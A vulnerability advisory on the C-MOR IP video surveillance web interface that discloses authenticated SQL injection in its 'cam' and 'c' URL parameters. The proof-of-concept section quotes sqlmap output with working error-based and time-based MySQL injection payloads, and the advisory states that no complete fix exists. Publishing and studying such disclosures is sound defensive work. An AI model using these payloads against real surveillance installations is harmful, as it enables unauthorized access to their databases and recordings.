~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper validation of user-supplied data, different
functionalities of the C-MOR web interface are vulnerable to SQL
injection attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that different
provided functionalities of the C-MOR web interface are vulnerable
to SQL injection attacks.

These kinds of attacks allow an authenticated user to execute arbitrary
SQL commands in the context of the corresponding MySQL database.

In the following pages, SQL injection vulnerabilities were found:

* list-timelapse.plm (URL parameter: "cam")
* list-motion.plm (URL parameter "cam")
* show-movies.plm (URL parameter "cam")

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

Using the software tool sqlmap[4], the SQL injection vulnerabilities
via the URL parameter "cam" could be easily exploited, as the following
output exemplarily illustrates:

(...)
sqlmap resumed the following injection point(s) from stored session:
- ---
Parameter: cam (GET)
     Type: error-based
     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or 
GROUP BY clause (FLOOR)
     Payload: days=1100&cam=cam1 AND (SELECT 2483 FROM(SELECT 
COUNT(*),CONCAT(0x717a707071,(SELECT 
(ELT(2483=2483,1))),0x717a707871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: days=1100&cam=cam1 AND (SELECT 9790 FROM 
(SELECT(SLEEP(5)))Yfcf)
- ---
[17:16:12] [INFO] the back-end DBMS is MySQL
[17:16:12] [INFO] fetching banner
[17:16:12] [INFO] resumed: '5.1.66-0+squeeze1'
web application technology: Apache
back-end DBMS: MySQL >= 5.0
banner: '5.1.66-0+squeeze1'
(...)


By exploiting the SQL injection vulnerabilities, the MySQL database
could be accessed and dumped as database user "cam".

In version 6.00PL01, some SQL injection attack instances were fixed.
However, others could still be found, for example via the URL
parameter "c" on the page getpic.pml.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

The described security vulnerability has not been fixed entirely in
the newly released software version 6.00PL01.

There is no fix for this security issue.
